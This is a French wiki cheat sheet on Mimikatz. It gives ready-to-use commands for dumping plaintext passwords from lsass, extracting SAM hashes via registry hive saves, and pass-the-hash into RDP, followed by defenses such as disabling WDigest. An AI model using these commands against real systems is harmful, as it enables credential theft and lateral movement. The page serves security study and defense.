---
title: Mimikatz
permalink: /Mimikatz/
---

# Mimikatz

## Commandes utiles

Repris de https://github.com/gentilkiwi/mimikatz/wiki

### Récupération mots de passe

#### online

``` text
privilege::debug
sekurlsa::logonpasswords
```

#### offline

A partir d'un dump lsass.dmp

``` text
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Récupération de hashs

#### online

``` text
privilege::debug
token::elevate
lsadump::sam
```

#### offline

Récupérer SAM et system:
```text
reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
```
Dumper les hashs avec mimikatz:
```text
lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
```

### Pass the hash et RDP
``` text
privilege::debug
sekurlsa::pth /user:heidegger /domain:SHINRA-INC /ntlm:XXXXXXXXXXXXXXXX /run:"mstsc.exe /restrictedadmin"
```

## Secrets d'authentification en mémoire

Les "logins" suivants provoquent le stockage d'information d'authenficaction en mémoire (https://technet.microsoft.com/en-us/windows-server-docs/security/securing-privileged-access/securing-privileged-access-reference-material#a-nameatltbmaadministrative-tools-and-logon-types):

-   Log on at console
-   Remote Desktop
-   RunAs
-   Powershell WiRM with CredSSP
-   PsExec with explicit creds
-   Scheduled Task
-   Tool running as a service
-   IIS "Basic Authentication"

Trucs & astuces:
- Sous les vieilles versions de Windows il est possible d'utiliser mimilove.
- Il est possible de dumper lsass et de l'analyser offline avec mimikatz.

## Défenses

Il existe plusieurs mécanismes pour se défendre contre les attaques utilisant Mimikatz (Plus d'informations sur ADSecurity: <https://adsecurity.org/?p=559>)

### Désactiver wdigest

A partir de Windows 8.1 et Windows Server 2012 les mots de passes ne sont plus stockés en mémoire par défaut. De plus il est possible de faire en sorte que les mots de passe n'apparaissent pas en mémoire dans les anciennes versions de Windows. Il faut pour cela:

-   Appliquer le patch KB2871997
-   Modifier la clé de registre suivante pour qu'elle ait 0:

``` text
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)
```


Références
----------

-   [Unofficial Guide to Mimikatz & Command Reference - ADSecurity](https://adsecurity.org/?page_id=1821)
-   [Mimikatz Overview, Defenses and Detection](https://www.sans.org/reading-room/whitepapers/detection/mimikatz-overview-defenses-detection-36780)
-   [Utilisation avancée de Mimikatz](http://connect.ed-diamond.com/MISC/MISC-066/Utilisation-avancee-de-Mimikatz)
-   [Administrative Tools and Logon Types](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ATLT_BM): Information sur la réutilisation des mots de passe

